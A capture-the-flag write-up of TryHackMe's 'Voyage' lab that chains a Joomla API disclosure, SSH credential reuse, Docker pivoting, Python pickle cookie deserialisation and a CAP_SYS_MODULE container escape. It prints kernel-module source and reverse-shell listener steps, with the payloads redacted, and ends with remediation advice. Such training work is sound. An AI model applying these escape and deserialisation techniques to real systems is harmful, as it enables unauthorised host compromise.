# Voyage Challenge 

![Banner](./../IMAGES/voyage_img.png?raw=true)

**Pathway:** *Web Application Red Teaming* | **Section:** *Chaining Vulnerabilities* | **Challenge:** *[Voyage](https://tryhackme.com/room/voyage)*

> [!IMPORTANT]
>
> **Working writeup notice:** This was a working and verified writeup at the time of writing on **22 July 2026**.
>
> **Spoiler warning:** This writeup documents the exploitation chain, although credentials, exact challenge-specific values, internal addressing, exploit payloads and flag codes are not shown.
>
> **Please note:** The IP addresses used during the lab were dynamically allocated by TryHackMe. The attack was performed from my own Kali Linux VM using OpenVPN to connect to the TryHackMe VPN.
>
> The following placeholders are used throughout:
>
> - `<TARGET_IP>` represents the IP address allocated to the target machine.
> - `<TUN0_IP>` represents the IP address assigned to the Kali Linux `tun0` interface.
> - `<REDACTED>` represents credentials, internal addresses, container identifiers, sensitive file contents, exact exploit values or other challenge giveaways.
> - `THM{....}` represents a redacted TryHackMe flag.
>
> **License:** Unless otherwise stated, all writeups and documentation in this repository are licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). Any original scripts or code snippets are provided under the [MIT Licence](https://opensource.org/license/mit/).

## About TryHackMe

This writeup was made possible by the hard work of the TryHackMe team and the wider cyber security community, who continue to create practical and engaging learning environments for aspiring security professionals.

[TryHackMe](https://tryhackme.com/) is an online cyber security training platform that provides hands-on labs covering penetration testing, networking, web application security, privilege escalation, red teaming and defensive security. Its rooms allow learners to develop practical technical skills within controlled and authorised environments.

## Lab Summary

Voyage is a Linux-based web application red teaming challenge focused on chaining several weaknesses across a containerised environment. The central lesson is that obtaining `root` inside a container does not necessarily mean that the underlying host has been compromised. The voyage continues until the real host boundary has been crossed.

The objective was to enumerate the exposed services, compromise a Joomla application, pivot through an internal Docker network, exploit unsafe Python deserialisation, obtain the user-level flag and escape a privileged container to recover the host-level root flag.

The successful attack chain involved:

1. Confirming VPN connectivity, routing and local hostname resolution.
2. Enumerating SSH, HTTP and a second SSH service.
3. Identifying Joomla on the web service.
4. Exploiting an unauthenticated Joomla API information-disclosure weakness.
5. Recovering redacted application and database credentials.
6. Reusing the credentials against the SSH service on port `2222`.
7. Recognising that the resulting root shell was inside a container.
8. Enumerating the internal Docker network.
9. Discovering a Flask finance application on an internal host.
10. Forwarding the internal service to Kali through SSH.
11. Authenticating to the finance panel with recovered credentials.
12. Identifying a hex-encoded Python pickle session cookie.
13. Replacing the cookie with a redacted malicious serialised object.
14. Receiving a reverse shell as root inside a second container.
15. Reading the user-level flag.
16. Identifying the dangerous `CAP_SYS_MODULE` Linux capability.
17. Compiling and loading a redacted kernel module.
18. Receiving a root shell from the underlying host.
19. Reading the root-level flag.

Confirmed lab details used during the walkthrough:

```text
Target IP: <TARGET_IP>
Kali tun0 IP: <TUN0_IP>
Attacker working directory: /tmp/VK/
Local hostname: voyage.thm
```

The target was added to the Kali VM's local hosts file:

```bash
echo "<TARGET_IP> voyage.thm" | sudo tee -a /etc/hosts
```

The mapping was confirmed with:

```bash
getent hosts voyage.thm
```

VPN routing and the tunnel address were also verified:

```bash
ip route get <TARGET_IP>
ip -br address show tun0
```

The expected result showed traffic leaving through `tun0` and using `<TUN0_IP>` as the source address:

```text
<TARGET_IP> via <REDACTED> dev tun0 src <TUN0_IP>
```

> [!TIP]
>
> When using your own Kali Linux VM, the `/etc/hosts` file is especially important in TryHackMe challenges. Many rooms depend on hostname-based routing, virtual hosts, redirects, cookies or application logic that may not work correctly when the expected hostname is missing.
>
> Over time, `/etc/hosts` can become cluttered with entries from previous rooms. It is advantageous to keep the file clear, tidy and focused on the challenge currently being worked on.
>
> A neglected hosts file eventually becomes DNS spaghetti - technically functional, but not something anybody should be proud of.

The file can be reviewed with:

```bash
cat /etc/hosts
```

An old entry for this room can be removed with:

```bash
sudo sed -i '/voyage\.thm/d' /etc/hosts
```

The correct mapping can then be added again using the currently allocated `<TARGET_IP>`.

## Tools Used

The principal tools and utilities used during the challenge were:

- `ip` for confirming VPN routing and the `tun0` address.
- `getent` for validating local hostname resolution.
- `nmap` and `rustscan` for TCP port, service and script enumeration.
- JoomScan for identifying the Joomla version and exposed application paths.
- A Joomla API information-disclosure proof of concept for retrieving exposed configuration data.
- Firefox for interacting with the Joomla site and internal finance application.
- NetExec for testing recovered SSH credentials.
- OpenSSH for interactive access and local port forwarding.
- `curl` for reviewing internal HTTP services.
- `nmap` inside the first container for Docker-network discovery and service enumeration.
- Firefox Developer Tools for inspecting and modifying application cookies.
- Python 3 and the `pickle` module for creating a redacted serialised payload.
- Netcat for reverse-shell listeners.
- `find`, `cat`, `ls`, `strings`, `uname` and `capsh` for Linux and container enumeration.
- GCC, Make and installed Linux kernel headers for compiling a loadable kernel module.
- `insmod` for loading the module through `CAP_SYS_MODULE`.

## Initial Enumeration

### Port and Service Discovery

A complete TCP SYN scan was performed first:

```bash
nmap -p- -sS -Pn -n --min-rate 5000 -oA voyage-allports voyage.thm
```

The scan identified three exposed TCP services:

```text
22/tcp    open  ssh
80/tcp    open  http
2222/tcp  open  <REDACTED>
```

A focused default-script and version scan was then performed against the discovered ports:

```bash
nmap -sC -sV -p22,80,2222 voyage.thm
```

The principal findings were:

```text
22/tcp    OpenSSH on Ubuntu
80/tcp    Apache HTTP Server on Ubuntu
2222/tcp  SSH service
```

The HTTP service reported Joomla as its content-management system. Nmap also identified `robots.txt` and several standard Joomla paths, including the administrator interface and API route.

> [!NOTE]
>
> Port `2222` was important. Scanning port `222` by mistake would miss the second SSH service and could lead to unnecessary troubleshooting.

### Joomla Enumeration

JoomScan was used against the web application:

```bash
joomscan -u http://voyage.thm
```

The scan identified Joomla `4.2.7`, the administrative login page, the API route and several directories with listing enabled.

Relevant findings included:

```text
Joomla version: 4.2.7
Administrator path: /administrator/
API path: /api/
robots.txt present
```

The detected version was reviewed for known weaknesses. The useful attack path was an unauthenticated API information-disclosure vulnerability affecting the Joomla version in use.

### Joomla API Information Disclosure

A public proof of concept was obtained and executed against the target:

```bash
git clone <REDACTED>
cd <REDACTED>
./exploit.sh http://voyage.thm
```

The response exposed Joomla user and configuration information. Challenge-specific values are omitted, but the output included:

```text
Administrative username: <REDACTED>
Database type: mysqli
Database host: localhost
Database username: <REDACTED>
Database password: <REDACTED>
Database name: <REDACTED>
Database prefix: <REDACTED>
```

The database password was not accepted by the SSH service on port `22`, which required public-key authentication. This did not mean the credential was useless; it needed to be tested against the other exposed authentication service.

## Exploits

### Credential Reuse Against the Second SSH Service

The disclosed username and password were used against the SSH service on port `2222`:

```bash
ssh <REDACTED>@voyage.thm -p 2222
```

After entering the redacted password, the login succeeded.

The shell context was checked:

```bash
id
pwd
whoami
hostname
```

The session reported UID `0`, but the hostname was a short hexadecimal identifier:

```text
uid=0(root) gid=0(root) groups=0(root)
hostname: <REDACTED>
```

This indicated that the shell was running as root inside a Docker container rather than on the underlying TryHackMe host.

### Container Reconnaissance

Root's Bash history provided a useful clue:

```bash
cat /root/.bash_history
```

The history contained:

```text
ls
curl
nmap
socat
exit
```

The container's network configuration was then reviewed:

```bash
cat /etc/hosts
ip -br address
ip route
```

A ping scan was performed against the attached Docker network:

```bash
nmap -sn <REDACTED>
```

This identified the current container, the Docker gateway and a second internal container at `<REDACTED>`.

A complete TCP scan of the second container found one service:

```bash
nmap -sC -sV -p- --min-rate 3000 <REDACTED>
```

The result was:

```text
5000/tcp open  HTTP
Server: Werkzeug / Python
Title: Tourism Secret Finance Panel
```

### SSH Local Port Forwarding

The internal finance service was not directly reachable from Kali. An SSH local port forward was created through the first container:

```bash
ssh -L 5000:<REDACTED>:5000 <REDACTED>@voyage.thm -p 2222
```

The tunnel made the internal application available locally at:

```text
http://127.0.0.1:5000
```

The SSH session was left open while the browser accessed the forwarded service.

> [!IMPORTANT]
>
> A trailing `#` in the browser address prevented the intended request from being processed correctly during testing. Removing the fragment and loading the clean URL allowed the application to execute the request as expected.

### Finance Panel Authentication

The finance panel accepted the same redacted credentials recovered from Joomla:

```text
Username: <REDACTED>
Password: <REDACTED>
```

Successful authentication opened the internal finance dashboard.

### Inspecting the Session Cookie

Firefox Developer Tools were opened with `F12`, followed by:

```text
Storage -> Cookies -> http://127.0.0.1:5000
```

The application stored a cookie named:

```text
session_data
```

Its value was a hexadecimal string beginning with Python pickle protocol bytes. Decoding it locally revealed a serialised dictionary containing the current username and a revenue value:

```python
{
    "user": "<REDACTED>",
    "revenue": "<REDACTED>"
}
```

This established that attacker-controlled cookie data was being hex-decoded and deserialised by Python `pickle`.

Python pickle is not safe for untrusted data. Its reduction mechanism can call arbitrary Python functions during deserialisation, which can lead directly to operating-system command execution.

### Unsafe Python Pickle Deserialisation

A Netcat listener was started on Kali:

```bash
nc -lvnp <REDACTED>
```

A Python script was then used to create a malicious pickle object. The exact payload, callback port and serialised value are redacted:

```bash
python3 -c '<REDACTED>'
```

The output was a long hexadecimal value:

```text
<REDACTED>
```

The existing `session_data` cookie was replaced with the malicious value in Firefox Developer Tools. Refreshing the application triggered server-side deserialisation and caused the internal finance container to connect back to Kali.

The listener received:

```text
connect to [<TUN0_IP>] from <TARGET_IP>
root@<REDACTED>:/finance-app#
```

No `socat` relay was required during this successful run. The internal application connected directly back to `<TUN0_IP>` once the correct URL was loaded.

### Second Container Enumeration

The new shell context was checked:

```bash
id
pwd
hostname
ls -la
```

The result confirmed root access inside the second container:

```text
uid=0(root) gid=0(root) groups=0(root)
Working directory: /finance-app
Hostname: <REDACTED>
```

The application directory contained Python source, static assets, templates and kernel-module build artefacts.

The user flag was located with:

```bash
find / -type f \( -iname 'user.txt' -o -iname 'flag.txt' -o -iname '*flag*' \) 2>/dev/null
```

The useful result was:

```text
/root/user.txt
```

The flag was read:

```bash
cat /root/user.txt
```

The result is intentionally redacted:

```text
THM{....}
```

### Linux Capability Enumeration

The container's Linux capabilities were reviewed:

```bash
capsh --print
```

The effective and bounding sets included:

```text
cap_sys_module
```

`CAP_SYS_MODULE` permits loading and unloading kernel modules. Because containers share the host kernel, granting this capability to a container effectively allows code to be introduced into the underlying host kernel.

This was the critical container-escape condition.

### Kernel Module Preparation

A clean build directory was created:

```bash
mkdir -p /tmp/exp
cd /tmp/exp
```

A small kernel module was written to invoke a redacted host-level reverse-shell command through `call_usermodehelper()`:

```c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kmod.h>

MODULE_LICENSE("GPL");

static int shell(void)
{
    char *argv[] = {
        "/bin/bash",
        "-c",
        "<REDACTED>",
        NULL
    };

    static char *env[] = {
        "HOME=/",
        "TERM=linux",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
        NULL
    };

    return call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
}

static int init_mod(void)
{
    return shell();
}

static void exit_mod(void)
{
    return;
}

module_init(init_mod);
module_exit(exit_mod);
```

A Makefile was created:

```makefile
obj-m += shell.o
```

The running kernel version was checked:

```bash
uname -r
```

The live host reported a slightly newer AWS kernel than the header tree available inside the container. Attempting to use the exact running-kernel build path failed because it was absent.

The installed header directory was used instead:

```bash
make -C /lib/modules/<REDACTED>/build M=$PWD modules
```

Compilation completed successfully and produced:

```text
shell.ko
```

### Host-Level Reverse Shell

A second listener was started on Kali:

```bash
nc -lvnp <REDACTED>
```

The kernel module was loaded from inside the container:

```bash
insmod shell.ko
```

Despite the minor header-version difference, the module loaded successfully and the listener received a connection from the underlying TryHackMe host:

```text
root@<REDACTED>:/#
```

The context was validated:

```bash
id
hostname
ls -la /
```

The hostname and root filesystem were different from both containers, confirming that this was the actual host.

The final flag was read:

```bash
cat /root/root.txt
```

The result is intentionally redacted:

```text
THM{....}
```

## Full Attack Chain Recap

### 1. VPN and Hostname Preparation
The target route and `tun0` address were confirmed before enumeration. `voyage.thm` was mapped to `<TARGET_IP>` in `/etc/hosts`, ensuring that the application was accessed through its expected hostname.

### 2. External Service Discovery
Full TCP enumeration identified SSH on port `22`, HTTP on port `80` and a second SSH service on port `2222`.

### 3. Joomla Identification
The web service was identified as Joomla `4.2.7`. Standard Joomla administration and API paths were exposed.

### 4. Joomla Information Disclosure
An unauthenticated Joomla API weakness disclosed configuration values, including reusable credentials. Exact values are omitted from this public writeup.

### 5. Credential Reuse
The disclosed credentials failed against port `22` but succeeded against the SSH service on port `2222`.

### 6. First Container Access
The SSH session provided UID `0`, but the hexadecimal hostname showed that the shell was inside a container rather than on the underlying host.

### 7. Internal Network Discovery
Nmap was used from the first container to discover another host on the attached Docker network.

### 8. Internal Finance Application
The second internal host exposed a Werkzeug-based Python web application on TCP port `5000`.

### 9. SSH Port Forwarding
A local SSH tunnel forwarded the internal finance service to `127.0.0.1:5000` on Kali.

### 10. Finance Panel Authentication
The credentials recovered from Joomla also authenticated successfully to the finance panel.

### 11. Pickle Cookie Discovery
The authenticated session used a hex-encoded Python pickle object in the `session_data` cookie.

### 12. Unsafe Deserialisation
The cookie was replaced with a redacted malicious pickle object. Refreshing the page caused the server to execute an operating-system command during deserialisation.

### 13. Second Container Compromise
The finance container connected back to Kali and provided a root shell.

### 14. User-Level Objective
The first flag was recovered from:

```text
/root/user.txt
```

The value is redacted:

```text
THM{....}
```

### 15. Dangerous Capability Discovery
`capsh --print` showed that the finance container had `CAP_SYS_MODULE`.

### 16. Kernel Module Compilation
A custom module was compiled using the Linux headers already present inside the container.

### 17. Container Escape
Loading the module with `insmod` caused a host-context process to connect back to Kali.

### 18. Host Root Access
The new shell exposed the underlying host's root filesystem and hostname, confirming a complete container escape.

### 19. Final Objective
The root-level flag was recovered from:

```text
/root/root.txt
```

The value is redacted:

```text
THM{....}
```

## Key Lessons

Voyage demonstrated several important penetration-testing, red teaming and defensive-security lessons:

- Confirm VPN routing and hostname resolution before troubleshooting application behaviour.
- Keep `/etc/hosts` tidy when using a personal Kali VM for TryHackMe rooms.
- Scan all TCP ports rather than assuming that common services use their default ports.
- Check unusual high ports carefully; a second instance of a familiar protocol may be the intended route.
- Content-management-system versions and exposed API routes should be reviewed together.
- Configuration disclosure can be more valuable than immediate remote code execution.
- Credentials recovered from one service should be tested carefully against other relevant services.
- Root inside a container is not equivalent to root on the host.
- Container hostnames, network ranges, mount points and capabilities help establish the actual security boundary.
- Shell history can provide useful clues about intended tooling and internal reconnaissance.
- Internal Docker networks should be treated as separate attack surfaces.
- SSH local forwarding is a clean and dependable way to expose an internal-only web service.
- Browser fragments such as a trailing `#` can change request behaviour and complicate exploit troubleshooting.
- Client-controlled session data must never be trusted merely because it is encoded.
- Encoding is not encryption, integrity protection or validation.
- Python `pickle` must never be used to deserialise data supplied by an untrusted client.
- Reusing application credentials across administrative services can turn information disclosure into infrastructure compromise.
- Linux capabilities should be enumerated even when the current shell already reports UID `0`.
- `CAP_SYS_MODULE` inside a container represents an extremely dangerous path to host compromise.
- Containers share the host kernel, so kernel-level privileges can collapse the isolation boundary.
- A successful escalation should be validated by checking the hostname, process context and filesystem rather than trusting the shell prompt.
- Public writeups should explain the reasoning and attack chain without publishing credentials, exact flags or unnecessary challenge giveaways.

The most important lesson was the distinction between **container root** and **host root**. The challenge deliberately provided several moments where the prompt displayed `root`, but only careful environmental validation showed whether the current shell had reached the final security boundary.

## Remediation Notes

### Joomla and Patch Management

- Keep Joomla core and all extensions fully patched.
- Subscribe to vendor security advisories and prioritise internet-facing CMS vulnerabilities.
- Remove unused components, modules, templates and API functionality.
- Restrict administrative interfaces to trusted networks where practical.
- Use a web application firewall as an additional layer rather than as a substitute for patching.
- Monitor unauthenticated access to sensitive API endpoints.
- Avoid exposing verbose configuration and user data through application APIs.

### Credential and Secret Management

- Never reuse database, CMS, SSH and internal administrative credentials.
- Use unique randomly generated secrets for every service and environment.
- Store secrets in a dedicated secrets-management system.
- Rotate credentials immediately after any information-disclosure incident.
- Prefer key-based SSH authentication for administrative access.
- Disable password authentication where it is not operationally required.
- Restrict SSH exposure to trusted management networks.
- Monitor authentication attempts across both standard and non-standard ports.

### Container Network Security

- Do not assume that an internal Docker network is trusted.
- Apply network segmentation between application tiers.
- Permit only the specific container-to-container flows required by the application.
- Use host firewall rules or container-network policies to restrict east-west traffic.
- Avoid exposing administrative services on shared application networks.
- Monitor network scans and unexpected service discovery between containers.
- Use separate networks for public web applications, databases and management services.

### Session and Deserialisation Security

- Never use Python `pickle` for untrusted or client-controlled data.
- Store session state server-side and expose only a random opaque session identifier to the client.
- Where client-side state is unavoidable, use a safe data format such as JSON with strict schema validation.
- Protect client-side session data with authenticated encryption or a strong message authentication code.
- Reject malformed, oversized or unexpected cookie values.
- Rotate session secrets and invalidate existing sessions after a compromise.
- Set appropriate `HttpOnly`, `Secure` and `SameSite` cookie attributes.
- Log deserialisation failures and unusual cookie changes.

### Container Privilege Hardening

- Never grant `CAP_SYS_MODULE` to application containers.
- Run containers with the smallest possible capability set.
- Use `--cap-drop=ALL` and add back only capabilities that are strictly required.
- Enable `no-new-privileges`.
- Run containers as a non-root user.
- Use a read-only root filesystem where practical.
- Apply seccomp, AppArmor or SELinux profiles.
- Prevent access to host devices and sensitive kernel interfaces.
- Avoid privileged containers.
- Review container manifests and Compose files for excessive capabilities.
- Treat any container with kernel-module privileges as equivalent to host root.

### Kernel and Host Protection

- Disable unprivileged or unnecessary kernel-module loading.
- Restrict module loading to trusted administrative workflows.
- Enforce module signing where supported.
- Monitor `init_module`, `finit_module`, `delete_module`, `insmod` and `modprobe` activity.
- Alert on unexpected outbound connections initiated by root or kernel helper processes.
- Keep kernel headers and compilation toolchains out of production containers unless operationally required.
- Separate build environments from runtime environments.
- Use immutable hosts and redeploy rather than manually repairing compromised containers.

### Operational Hygiene

- Keep `/etc/hosts` limited to active lab mappings.
- Remove stale challenge entries after each room.
- Maintain a separate working directory for scans, payloads and evidence.
- Record target, hostname and `tun0` details at the beginning of each engagement.
- Validate each stage of an attack chain before moving on.
- Confirm whether a shell belongs to a container, virtual machine or host.
- Remove listeners, tunnels and temporary files after the authorised assessment is complete.

## Disclaimer

This writeup is intended solely for education, training and documentation of an authorised TryHackMe lab.

All tools, commands, payloads and post-exploitation techniques described here were used within a controlled environment provided by TryHackMe. Permission to interact with the target was granted by the platform owner and operator as part of the room.

The tools and methods documented in this walkthrough represent one successful approach. They are not the only possible techniques, and alternative tools or workflows may produce the same result.

Never test, scan, exploit or access a system without clear and explicit authorisation from its owner.

---
[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoffee.com/v4l1k4hn)  

**Powered on ☕ made with ❤️ by [V4L1K4HN](https://tryhackme.com/p/V4L1K4HN)**  
⭐ If this project is useful, consider starring it on GitHub.
